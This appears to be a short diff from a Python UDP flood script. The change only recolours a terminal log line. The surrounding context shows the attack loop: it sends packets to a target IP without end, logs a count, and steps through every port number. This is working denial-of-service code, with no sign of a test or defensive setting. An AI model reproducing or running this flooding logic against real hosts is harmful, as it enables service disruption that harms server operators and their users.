@@ -88,7 +88,7 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
         while True:
             sock.sendto(data, (ip, port))
             sent += 1
-            log_message(f"\033[38;5;220mThreading-get \033[37m|\033[31m {threading.get_ident()} \033[37m| \033[38;5;57msent {sent} \033[37m|")
+            log_message(f"\033[38;5;220mThreading-get \033[37m|\033[91m {threading.get_ident()}  \033[37m| \033[33msent {sent} \033[37m|")
             sent += 1
             log_message(f"\033[38;5;37m• • Server-Ip \033[37m|\033[32m {ip} \033[37m|\033[33mPort: \033[37m{port}")
             port = port + 1 if port < 65534 else 1
